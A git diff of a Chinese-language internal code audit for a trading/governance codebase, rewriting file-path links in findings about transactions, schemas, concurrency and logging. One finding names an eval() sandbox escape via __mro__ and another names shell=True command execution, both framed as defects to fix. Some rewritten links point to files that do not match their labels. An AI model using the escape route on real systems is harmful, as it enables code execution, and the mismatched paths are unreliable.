@@ -2274,22 +2274,22 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 > 审计方法：Grep + Read真实文件取证（task_repo.py、apply_depgraph.py、sync_yaml_to_depgraph.py、retry实现、dlq_retry_policy.py等）
 
 #### 5.15.1 transition()事务内subprocess循环验收长时持锁【HIGH】
-- 证据：[task_repo.py:1566](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `with self._write_tx() as conn:` 开启BEGIN IMMEDIATE；`:1612` 事务内调 `_run_circular_acceptance`；`:1807-1835` 循环2轮×N命令，每命令 `subprocess.run(shell=True,timeout=120)`，最坏240s+持RESERVED锁
+- 证据：[task_repo.py:1566](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/task_repo.py) `with self._write_tx() as conn:` 开启BEGIN IMMEDIATE；`:1612` 事务内调 `_run_circular_acceptance`；`:1807-1835` 循环2轮×N命令，每命令 `subprocess.run(shell=True,timeout=120)`，最坏240s+持RESERVED锁
 - 病根：根因5（事务边界与IO混合）
 - 修复：循环验收移到`_write_tx`之前——先全部验收，再开短事务落盘
 
 #### 5.15.2 transition(COMPLETED) DB提交后git失败仅warning不补偿【HIGH】
-- 证据：[task_repo.py:1626-1650](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) UPDATE tasks COMMIT；`:1687-1692` `_auto_commit_on_completion` 包在 `try/except:warning`，DB已commit不回滚
+- 证据：[task_repo.py:1626-1650](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/task_repo.py) UPDATE tasks COMMIT；`:1687-1692` `_auto_commit_on_completion` 包在 `try/except:warning`，DB已commit不回滚
 - 病根：根因5（缺saga补偿模式）
 - 修复：Outbox模式——COMPLETED+pending_git_commit事件异步重试
 
 #### 5.15.3 dlq_retry_policy.retry_pending()查不存在的表【HIGH】
-- 证据：[dlq_retry_policy.py:44](file:///d:/ZephyrAlpha/src/zephyr/governance/dlq_retry_policy.py) `SELECT COUNT(*) FROM dlq_messages`；[sqlite_schema.py](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) 无此表；`:49` `except:warning→return RetryResult(status="degraded")`；`BACKOFF_SCHEDULE`（`:27`）死代码
+- 证据：[dlq_retry_policy.py:44](file:///d:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/dlq_retry_policy.py) `SELECT COUNT(*) FROM dlq_messages`；[sqlite_schema.py](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) 无此表；`:49` `except:warning→return RetryResult(status="degraded")`；`BACKOFF_SCHEDULE`（`:27`）死代码
 - 病根：根因1（blueprint声明表/schema未建/代码查询必然失败）
 - 修复：补建dlq_messages表或改查orchestrator/dlq_manager
 
 #### 5.15.4 batch_review 7维度跨7独立事务部分失败【MEDIUM】
-- 证据：[task_repo.py:1885-1895](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `for dim in _BATCH_REVIEW_DIMENSIONS:` 循环内每次单独事务INSERT，第3维度异常前2已commit，consecutive_zero错乱
+- 证据：[task_repo.py:1885-1895](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/task_repo.py) `for dim in _BATCH_REVIEW_DIMENSIONS:` 循环内每次单独事务INSERT，第3维度异常前2已commit，consecutive_zero错乱
 - 病根：根因5（批量无原子边界）
 - 修复：7维度结果先收集内存，单_write_tx一次性INSERT
 
@@ -2299,7 +2299,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：改 `INSERT ... ON CONFLICT (node_id) DO UPDATE SET ...`
 
 #### 5.15.6 sync_yaml_to_depgraph finally块二次commit+触发器恢复失败仅warning【MEDIUM】
-- 证据：[sync_yaml_to_depgraph.py:1082-1099](file:///d:/ZephyrAlpha/scripts/governance/sync_yaml_to_depgraph.py) 主except `rollback();raise`；finally内 `restore_readonly_triggers;commit()`，DDL在rollback后独立commit，`:1095` `except:print` 吞恢复失败
+- 证据：[sync_yaml_to_depgraph.py:1082-1099](file:///d:/ZephyrAlpha/scripts/governance/d8_doc_sync/sync_yaml_to_depgraph.py) 主except `rollback();raise`；finally内 `restore_readonly_triggers;commit()`，DDL在rollback后独立commit，`:1095` `except:print` 吞恢复失败
 - 病根：根因5（finally块副作用+事务状态混乱）
 - 修复：finally只做close，触发器恢复移入主try commit前
 
@@ -2314,7 +2314,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：重试耗尽应 `raise RetryExhaustedError(...) from final_error`
 
 #### 5.15.9 reconciler.reconcile()引用未导入的AssetType【MEDIUM】
-- 证据：[reconciler.py:105,146](file:///d:/ZephyrAlpha/src/zephyr/governance/reconciler.py) `AssetType.UNKNOWN`，但import块（`:31-43`）无AssetType，cls为None时NameError崩溃
+- 证据：[reconciler.py:105,146](file:///d:/ZephyrAlpha/src/zephyr/governance/drift_detection/reconciler.py) `AssetType.UNKNOWN`，但import块（`:31-43`）无AssetType，cls为None时NameError崩溃
 - 病根：根因5（未导入符号+默认值回退路径未测试）
 - 修复：补import或用字符串字面量
 
@@ -2335,17 +2335,18 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：`get_depgraph_pg_connection`返回@contextmanager或全部改 `with closing(...)`
 
 #### 5.15.13 sqlite_schema._run_migration benign关键词匹配过宽吞错【MEDIUM】
-- 证据：[sqlite_schema.py:988-1000](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `except OperationalError:` 字符串匹配"duplicate column/already exists"后continue，含这些词的真实错误被吞；v23/v25用 `PRAGMA writable_schema=ON` 改sqlite_master
+- 证据：[sqlite_schema.py:988-1000](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) `except OperationalError:` 字符串匹配"duplicate column/already exists"后continue，含这些词的真实错误被吞；v23/v25用 `PRAGMA writable_schema=ON` 改sqlite_master
 - 病根：根因5（错误吞掉）
 - 修复：用精确sqlite3错误码或迁移语句保证幂等（IF NOT EXISTS）
 
 #### 5.15.14 sync_progress.save_progress临时文件异常不清理【LOW】
 - 证据：[sync_progress.py:51-54](file:///d:/ZephyrAlpha/scripts/governance/sync_progress.py) `tmp=...;with open(tmp,"w"):json.dump(...);os.replace(tmp,...)`，json.dump异常时tmp残留无try/finally
+- **[✓ FIXED: 2026-07-04]** `scripts/governance/sync_progress.py` 文件已删除，债务不复存在
 - 病根：根因5（临时文件异常路径未清理）
 - 修复：`try:...;os.replace;finally:if exists:remove`
 
 #### 5.15.15 task_repo单连接+threading.RLock仅进程内，跨进程多session抛"database is locked"【MEDIUM】
-- 证据：[task_repo.py:652-653](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `with self._lock:` (RLock进程内) + `BEGIN IMMEDIATE`；[sqlite_schema.py:440](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `PRAGMA busy_timeout=5000` 仅等5s；多AI session各自TaskRepository实例共享governance.db
+- 证据：[task_repo.py:652-653](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/task_repo.py) `with self._lock:` (RLock进程内) + `BEGIN IMMEDIATE`；[sqlite_schema.py:440](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) `PRAGMA busy_timeout=5000` 仅等5s；多AI session各自TaskRepository实例共享governance.db
 - 病根：根因5（跨进程并发无显式锁）
 - 修复：task_repo迁移PG或引入跨进程advisory lock
 
@@ -2376,7 +2377,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：抽取`@threadsafe_singleton`装饰器强制统一
 
 #### 5.16.3 fault_types.get_default_registry无锁单例+多次注册【HIGH】
-- 证据：[fault_types.py:157-170](file:///d:/ZephyrAlpha/src/zephyr/trading/orchestrator/fault_types.py) `_DEFAULT_REGISTRY=None; if is None: create+register 5个` 无锁check-then-act，并发可各自创建registry并register，返回不同实例
+- 证据：[fault_types.py:157-170](file:///d:/ZephyrAlpha/src/zephyr/trading/orchestrator/fault_tolerance/fault_types.py) `_DEFAULT_REGISTRY=None; if is None: create+register 5个` 无锁check-then-act，并发可各自创建registry并register，返回不同实例
 - 病根：根因2（单例模式无统一规范）
 - 修复：`functools.lru_cache(maxsize=1)` 或加模块级Lock
 
@@ -2401,7 +2402,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：抽取`run_async_safely(coro)`到async_runtime.py统一
 
 #### 5.16.10 BackpressureManager get_state/get_all_paused返回可变对象别名【MEDIUM】
-- 证据：[backpressure_manager.py:187-193](file:///d:/ZephyrAlpha/src/zephyr/integration/backpressure_manager.py) `with self._lock: return self._get_or_create(symbol)` 返回dict内对象引用，调用方可外部无锁修改`paused_until`/`max_rate_per_sec`，破坏内部不变量
+- 证据：[backpressure_manager.py:187-193](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/backpressure_manager.py) `with self._lock: return self._get_or_create(symbol)` 返回dict内对象引用，调用方可外部无锁修改`paused_until`/`max_rate_per_sec`，破坏内部不变量
 - 病根：根因5（RLock保护字典结构但未保护字典内对象字段）
 - 修复：返回`copy.deepcopy(state)`或冻结为`dataclass(frozen=True)`
 
@@ -2467,17 +2468,17 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：链状态持久化append-only存储，禁止clear()或需二次授权留痕
 
 #### 5.17.5 TamperEvidentLog hash链无HMAC/trusted anchor可整体重写【MEDIUM】
-- 证据：[tamper_evident_log.py:67-98](file:///d:/ZephyrAlpha/src/zephyr/governance/tamper_evident_log.py) `hashlib.sha256(f"{counter}:{action}:{data}:{now}:{prev_hash}")` 纯明文无密钥；`:84` `open(self._log_path,"a")` 创建文件未设权限（默认0o644世界可读可写）；攻击者获文件写权限可从首条重算整链，`verify()`无法察觉
+- 证据：[tamper_evident_log.py:67-98](file:///d:/ZephyrAlpha/src/zephyr/governance/security_governance/tamper_evident_log.py) `hashlib.sha256(f"{counter}:{action}:{data}:{now}:{prev_hash}")` 纯明文无密钥；`:84` `open(self._log_path,"a")` 创建文件未设权限（默认0o644世界可读可写）；攻击者获文件写权限可从首条重算整链，`verify()`无法察觉
 - 病根：根因5（tamper-evident实为tamper-forgable）
 - 修复：改HMAC-SHA256，定期tail_hash外部锚定（git/远程签名）
 
 #### 5.17.6 StageContext.evaluate_skip用eval执行配置字符串【HIGH】
-- 证据：[integration/models.py:598-603](file:///d:/ZephyrAlpha/src/zephyr/integration/models.py) `def evaluate_skip(self,condition): namespace={"ctx":self,"all":all,"any":any}; return bool(eval(condition,{"__builtins__":{}},namespace))`；`{"__builtins__":{}}`限制可经`ctx.__class__.__mro__`逃逸；condition来自`PipelineStage.skip_condition`配置，`ai_autonomy=ai_modifiable`普遍标注——AI改配置即RCE
+- 证据：[integration/models.py:598-603](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/models.py) `def evaluate_skip(self,condition): namespace={"ctx":self,"all":all,"any":any}; return bool(eval(condition,{"__builtins__":{}},namespace))`；`{"__builtins__":{}}`限制可经`ctx.__class__.__mro__`逃逸；condition来自`PipelineStage.skip_condition`配置，`ai_autonomy=ai_modifiable`普遍标注——AI改配置即RCE
 - 病根：根因5（用eval表达配置条件）
 - 修复：改受限表达式求值器（ast.literal_eval+白名单或simpleeval库）
 
 #### 5.17.7 task_repo.py生产路径shell=True违反D-A-03红线【HIGH】
-- 证据：[task_repo.py:1811-1817](file:///d:/ZephyrAlpha/src/zephyr/governance/task_repo.py) `subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)`；cmd来自task定义`commands:list[str]`；`validate_script_quality.py:378` 明令"禁止shell=True"且`detect_shell_true.py`专门扫描，但src/生产代码仍含此违规
+- 证据：[task_repo.py:1811-1817](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/task_repo.py) `subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)`；cmd来自task定义`commands:list[str]`；`validate_script_quality.py:378` 明令"禁止shell=True"且`detect_shell_true.py`专门扫描，但src/生产代码仍含此违规
 - 病根：根因5（门禁覆盖盲区，扫描器未覆盖src/或CI未阻断）
 - 修复：改`subprocess.run(shlex.split(cmd))`，扫描器扩展到src/
 
@@ -2535,12 +2536,12 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - [✓ FIXED: 2026-07-03 批次A收尾] 同 5.18.2，02_create_pg_schema.sql rule_bindings 表添加债务说明注释，决策为"应用层校验"（rule_id 真源是 YAML，非 DB 表），不补 FK
 
 #### 5.18.4 gate_decisions表存在3个互斥的schema定义（schema分裂）【HIGH】
-- 证据：[sqlite_schema.py:919](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) v28 migration `gate_decisions(decision_id INTEGER PK, gate_id TEXT, decision TEXT, reason TEXT, decided_at TEXT, decided_by TEXT)` 无FK；[gate_persistence.py:142](file:///d:/ZephyrAlpha/src/zephyr/governance/drift_detection/gate_persistence.py) `gate_decisions(id INTEGER PK, module_id TEXT, gate TEXT, decision TEXT, detail TEXT, decided_at TEXT)` 列名完全不同；`red_blue_report.json:31` 报告历史v3曾有gate_decisions→gates的FK
+- 证据：[sqlite_schema.py:919](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) v28 migration `gate_decisions(decision_id INTEGER PK, gate_id TEXT, decision TEXT, reason TEXT, decided_at TEXT, decided_by TEXT)` 无FK；[gate_persistence.py:142](file:///d:/ZephyrAlpha/src/zephyr/governance/drift_detection/gate_persistence.py) `gate_decisions(id INTEGER PK, module_id TEXT, gate TEXT, decision TEXT, detail TEXT, decided_at TEXT)` 列名完全不同；`red_blue_report.json:31` 报告历史v3曾有gate_decisions→gates的FK
 - 病根：根因2（同名表多定义，两模块各建各的）
 - 修复：统一gate_decisions为单一DDL真源，删除散点建表
 
 #### 5.18.5 tasks.domain_id跨数据库外键（SQLite无法实现）【HIGH】
-- 证据：[test_db_integration.py:5](file:///d:/ZephyrAlpha/tests/db/test_db_integration.py) 注释"governance.db的tasks.domain_id→depgraph的domains.domain_id外键一致性"；[sqlite_schema.py:915](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) v28 migration `UPDATE tasks SET domain_id=NULL WHERE domain_id NOT IN (SELECT domain_id FROM domains)` 清洗485行违规；但governance.db的tasks表DDL从未定义domain_id列也无FK——跨库FK SQLite物理上无法实现
+- 证据：[test_db_integration.py:5](file:///d:/ZephyrAlpha/tests/db/test_db_integration.py) 注释"governance.db的tasks.domain_id→depgraph的domains.domain_id外键一致性"；[sqlite_schema.py:915](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) v28 migration `UPDATE tasks SET domain_id=NULL WHERE domain_id NOT IN (SELECT domain_id FROM domains)` 清洗485行违规；但governance.db的tasks表DDL从未定义domain_id列也无FK——跨库FK SQLite物理上无法实现
 - 病根：根因1（9库→3库合并未完成，跨库引用遗留）
 - 修复：tasks.domain_id列删除，或domains表迁入governance.db，或改PG跨schema FK
 
@@ -2550,17 +2551,17 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：为nodes.domain_id、arch_directory_tree.domain_id、domain_mapping.domain_id补FK
 
 #### 5.18.10 task_reviews外键无ON DELETE CASCADE（与task_files不一致）【MEDIUM】 [⚠ STILL_VALID: 2026-07-04 验证声明不实——sqlite_schema.py:353 FK无ON DELETE CASCADE，原修复声明未落地]
-- 证据：[sqlite_schema.py:342](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `FOREIGN KEY (task_id) REFERENCES tasks(task_id)` 无级联；对比[sqlite_schema.py:202](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) task_files `task_id TEXT NOT NULL REFERENCES tasks(task_id) ON DELETE CASCADE`；删除task后task_files自动清理但task_reviews留孤儿；v29(L933)才补建task_reviews仍未加CASCADE
+- 证据：[sqlite_schema.py:342](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) `FOREIGN KEY (task_id) REFERENCES tasks(task_id)` 无级联；对比[sqlite_schema.py:202](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) task_files `task_id TEXT NOT NULL REFERENCES tasks(task_id) ON DELETE CASCADE`；删除task后task_files自动清理但task_reviews留孤儿；v29(L933)才补建task_reviews仍未加CASCADE
 - 病根：根因5（约束应用不一致，同级FK级联规则不统一）
 - 修复：统一所有引用tasks(task_id)的FK加`ON DELETE CASCADE`
 
 #### 5.18.11 fle_dispatch_log外键无ON DELETE CASCADE【MEDIUM】 [⚠ STILL_VALID: 2026-07-04 验证声明不实——sqlite_schema.py:328 event_id FK无ON DELETE CASCADE，原修复声明未落地]
-- 证据：[sqlite_schema.py:317](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `event_id TEXT NOT NULL REFERENCES fle_alerts(event_id)` 无级联；删除fle_alerts记录时被FK阻断（RESTRICT默认）或留孤儿（若PRAGMA foreign_keys=OFF）
+- 证据：[sqlite_schema.py:317](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) `event_id TEXT NOT NULL REFERENCES fle_alerts(event_id)` 无级联；删除fle_alerts记录时被FK阻断（RESTRICT默认）或留孤儿（若PRAGMA foreign_keys=OFF）
 - 病根：根因5（FK级联规则未规范化）
 - 修复：加`ON DELETE CASCADE`，dispatch_log是alert从属记录
 
 #### 5.18.14 gates表在两个DB中结构完全不同（同名异构）【MEDIUM】
-- 证据：depgraph [00_sqlite_actual_schema.sql:225-236](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/00_sqlite_actual_schema.sql) `gates(gate_id TEXT PK, name, entry, description, files_trigger, always_run, category, status, source, event_driven, auto_start)` 11列只读表（YAML真源）；governance.db [sqlite_schema.py:163-174](file:///d:/ZephyrAlpha/src/zephyr/governance/sqlite_schema.py) `gates(gate_run_id TEXT PK, gate_id TEXT, passed INTEGER, details, artifact_path, session_id, task_id, created_at)` 7列运行记录；两表同名但列名/语义/PK完全不同，跨库JOIN出错
+- 证据：depgraph [00_sqlite_actual_schema.sql:225-236](file:///d:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/00_sqlite_actual_schema.sql) `gates(gate_id TEXT PK, name, entry, description, files_trigger, always_run, category, status, source, event_driven, auto_start)` 11列只读表（YAML真源）；governance.db [sqlite_schema.py:163-174](file:///d:/ZephyrAlpha/src/zephyr/governance/persistence/sqlite_schema.py) `gates(gate_run_id TEXT PK, gate_id TEXT, passed INTEGER, details, artifact_path, session_id, task_id, created_at)` 7列运行记录；两表同名但列名/语义/PK完全不同，跨库JOIN出错
 - 病根：根因2（同名表多定义）
 - 修复：governance.db的gates改名`gate_runs` [✓ 2026-07-03 治本补全：v15 改名漏改 3 生产文件（gate_engine.py INSERT INTO gates、system_snapshot.py FROM gates、olap_engine.py _table("gates")+gates_fallback）+ 8 测试文件，已全部对齐 gate_runs；auto_runner.py 引用 depgraph gates 表（PG 仍存在）不改；test_f18_redblue.py 引用 depgraph gates（全部 skip）不改]
 
@@ -2611,7 +2612,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 > 审计方法：Grep + Read真实文件取证（integration/models.py、shared/contracts/protocols.py、auto_fix_engine/models.py等）
 
 #### 5.19.1 Pydantic v1 class Config与v2 model_config在同一文件混用【HIGH】
-- 证据：[integration/models.py:504](file:///d:/ZephyrAlpha/src/zephyr/integration/models.py) `class Config: use_enum_values=True`（v1语法），同文件L114/143/155/215用 `model_config=BASE_CONFIG`（v2语法）；[infrastructure/pipeline/models.py:505](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/models.py) 同混用；[agent_identity.py:144](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/identity/agent_identity.py) 同
+- 证据：[integration/models.py:504](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/models.py) `class Config: use_enum_values=True`（v1语法），同文件L114/143/155/215用 `model_config=BASE_CONFIG`（v2语法）；[infrastructure/pipeline/models.py:505](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/models.py) 同混用；[agent_identity.py:144](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/identity/agent_identity.py) 同
 - 病根：根因1（v1→v2迁移未完成，pydantic_v2_migrator.py未扫描class Config模式）
 - 修复：替换为 `model_config=ConfigDict(use_enum_values=True)`，migrator增加class Config检测
 
@@ -2626,12 +2627,12 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：改为 `class BaseFixer(abc.ABC)` + `@abc.abstractmethod`
 
 #### 5.19.4 verify_chain()返回类型LSP违约——6个实现6种返回类型【HIGH】
-- 证据：[protocols.py:104](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `-> dict`；[integrity.py:107](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/integrity.py) `-> dict[str,Any]`；[forensic_package.py:45](file:///d:/ZephyrAlpha/src/zephyr/governance/forensic_package.py) `-> bool`；[audit_chain_verifier.py:115](file:///d:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/audit_chain_verifier.py) `-> AuditReport`；[risk_mitigation.py:220](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py) `-> tuple[bool,list[str]]`；[crypto_bootstrap.py:72](file:///d:/ZephyrAlpha/src/zephyr/ops/forensic/crypto_bootstrap.py) `-> bool`
+- 证据：[protocols.py:104](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `-> dict`；[integrity.py:107](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/integrity.py) `-> dict[str,Any]`；[forensic_package.py:45](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/forensic_package.py) `-> bool`；[audit_chain_verifier.py:115](file:///d:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/audit_chain_verifier.py) `-> AuditReport`；[risk_mitigation.py:220](file:///d:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py) `-> tuple[bool,list[str]]`；[crypto_bootstrap.py:72](file:///d:/ZephyrAlpha/src/zephyr/trading/feedback_loop/forensic/crypto_bootstrap.py) `-> bool`
 - 病根：根因1（接口契约未SSoT化，Liskov替换原则彻底失效）
 - 修复：定义统一 `ChainVerificationResult` 类型，所有实现返回此类型
 
 #### 5.19.5 sign_token()签名与返回类型契约漂移【HIGH】
-- 证据：[agent_identity.py:152](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/identity/agent_identity.py) `def sign_token(self,secret:str)->str`；[identity.py:142](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/identity.py) `def sign_token(self,secret:str)->None`；[cross_session_detector.py:83](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/cross_session_detector.py) `def sign_token(self,agent_id,session_id)->SignedToken`；三同名方法签名/参数/返回类型完全不同
+- 证据：[agent_identity.py:152](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/identity/agent_identity.py) `def sign_token(self,secret:str)->str`；[identity.py:142](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/identity.py) `def sign_token(self,secret:str)->None`；[cross_session_detector.py:83](file:///d:/ZephyrAlpha/src/zephyr/security/access_control/detectors/cross_session_detector.py) `def sign_token(self,agent_id,session_id)->SignedToken`；三同名方法签名/参数/返回类型完全不同
 - 病根：根因1（三方对齐失败，无共享Protocol约束）
 - 修复：定义 `TokenSignerProtocol` 统一签名
 
@@ -2641,7 +2642,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：改为ABC+abstractmethod或实现默认返回
 
 #### 5.19.7 重复api_client.py类型漂移（Any vs object）【MEDIUM】
-- 证据：[shared/api/api_client.py:377](file:///d:/ZephyrAlpha/src/zephyr/shared/api/api_client.py) `response_body:Any=await resp.json()`；[integration/shared/api_03/api_client.py:377](file:///d:/ZephyrAlpha/src/zephyr/integration/shared/api_03/api_client.py) `response_body:object=await resp.json()`；两文件其余内容完全相同，类型标注已漂移
+- 证据：[shared/api/api_client.py:377](file:///d:/ZephyrAlpha/src/zephyr/shared/api/api_client.py) `response_body:Any=await resp.json()`；[integration/shared/api_03/api_client.py:377](file:///d:/ZephyrAlpha/src/zephyr/shared/api/api_client.py) `response_body:object=await resp.json()`；两文件其余内容完全相同，类型标注已漂移
 - 病根：根因1（SSoT断裂，同一份代码两路径维护）
 - 修复：删除integration/shared/api_03/api_client.py，全局只保留shared/api/
 
@@ -2656,7 +2657,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：从Protocol移除 `name:str` 数据属性改为 @property
 
 #### 5.19.10 Pydantic模型字段使用可变默认值=[]/={}而非Field(default_factory)【MEDIUM】
-- 证据：[integration/models.py:120,121](file:///d:/ZephyrAlpha/src/zephyr/integration/models.py) `output:dict[str,Any]={}` `errors:list[str]=[]`；[protocols.py:94](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `capabilities:list[str]=[]`；同文件其他字段用 `Field(default_factory=list)` 风格不统一
+- 证据：[integration/models.py:120,121](file:///d:/ZephyrAlpha/src/zephyr/governance/audit_trail/models.py) `output:dict[str,Any]={}` `errors:list[str]=[]`；[protocols.py:94](file:///d:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py) `capabilities:list[str]=[]`；同文件其他字段用 `Field(default_factory=list)` 风格不统一
 - 病根：根因5（风格不统一，未来改dataclass会引入bug）
 - 修复：统一为 `Field(default_factory=dict/list)`，ruff规则RUF012检测
 
@@ -2687,12 +2688,12 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 > 审计方法：Grep + Read真实文件取证（ops/observability/logging.py、metrics.py、trading/__main__.py等）
 
 #### 5.20.1 三套并存的日志实现（含逐字复制副本）【HIGH】
-- 证据：[ops/observability/logging.py](file:///d:/ZephyrAlpha/src/zephyr/shared/logging.py) 规范实现357行；[shared/observability_02/logging.py](file:///d:/ZephyrAlpha/src/zephyr/shared/observability_02/logging.py) 逐字相同副本（仅module_id注释不同）；structlog第三套：`autonomy_core/prompt_registry.py:61,83`、`infrastructure/_base_server.py:71,172`、`governance/persistence/olap_engine.py:67,78` 等5个模块直接用 `structlog.get_logger().bind(...)`
+- 证据：[ops/observability/logging.py](file:///d:/ZephyrAlpha/src/zephyr/shared/utils/logging.py) 规范实现357行；[shared/observability_02/logging.py](file:///d:/ZephyrAlpha/src/zephyr/shared/utils/logging.py) 逐字相同副本（仅module_id注释不同）；structlog第三套：`autonomy_core/prompt_registry.py:61,83`、`infrastructure/_base_server.py:71,172`、`governance/persistence/olap_engine.py:67,78` 等5个模块直接用 `structlog.get_logger().bind(...)`
 - 病根：根因1（SSoT断裂，shared/observability_02是历史副本未清理，structlog与ZephyrLogger不互通）
 - 修复：删除shared/observability_02/，structlog调用统一替换为get_logger(__name__)
 
 #### 5.20.2 100+文件违反"禁止裸logging.getLogger()"约定【HIGH】
-- 证据：[ops/observability/logging.py:37](file:///d:/ZephyrAlpha/src/zephyr/shared/logging.py) 明确"禁止裸logging.getLogger()"；Grep `logging\.getLogger` 在src/命中100个文件101处；典型：`trading/boot_hooks.py`、`infrastructure/audit_logger.py:66`、`ex_core/order_manager.py:51`、`autonomy_core/llm_gateway.py [⚠ 已删除]:40`
+- 证据：[ops/observability/logging.py:37](file:///d:/ZephyrAlpha/src/zephyr/shared/utils/logging.py) 明确"禁止裸logging.getLogger()"；Grep `logging\.getLogger` 在src/命中100个文件101处；典型：`trading/boot_hooks.py`、`infrastructure/audit_logger.py:66`、`ex_core/order_manager.py:51`、`autonomy_core/llm_gateway.py [⚠ 已删除]:40`
 - 病根：根因5（约定-执行缺口，规范只在docstring无arch_guard强制）
 - 修复：arch_guard增加 `forbid_logging_getLogger` 规则，100个文件分批迁移
 
@@ -2702,7 +2703,7 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - 修复：__main__.py中boot/reconcile/shutdown走 `logger.info(...,extra={"phase":"boot"})`
 
 #### 5.20.4 cost_budget.py调用不存在的registry.counter().inc(value=,labels=)被静默吞掉【HIGH】
-- 证据：[cost_budget.py:190-196](file:///d:/ZephyrAlpha/src/zephyr/governance/cost_budget.py) `registry.counter(COUNT_LLM_CALLS).inc(labels={...})` `registry.counter("zephyr_llm_cost_usd_total").inc(value=int(cost*10000),labels={...})` `except Exception: pass`；但 [metrics.py](file:///d:/ZephyrAlpha/src/zephyr/shared/metrics.py) MetricsRegistry无 `counter()` 工厂方法，`inc(self,name,labels=None)` 不接受value参数；每次调用必然AttributeError被吞——LLM成本指标永远没被采集但代码自以为已采集
+- 证据：[cost_budget.py:190-196](file:///d:/ZephyrAlpha/src/zephyr/governance/ops_governance/cost_budget.py) `registry.counter(COUNT_LLM_CALLS).inc(labels={...})` `registry.counter("zephyr_llm_cost_usd_total").inc(value=int(cost*10000),labels={...})` `except Exception: pass`；但 [metrics.py](file:///d:/ZephyrAlpha/src/zephyr/backtest/core/metrics.py) MetricsRegistry无 `counter()` 工厂方法，`inc(self,name,labels=None)` 不接受value参数；每次调用必然AttributeError被吞——LLM成本指标永远没被采集但代码自以为已采集
 - 病根：根因5（API漂移+静默异常）
 - 修复：删除except:pass改logger.warning，统一MetricsRegistry API
 
@@ -2712,27 +2713,27 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
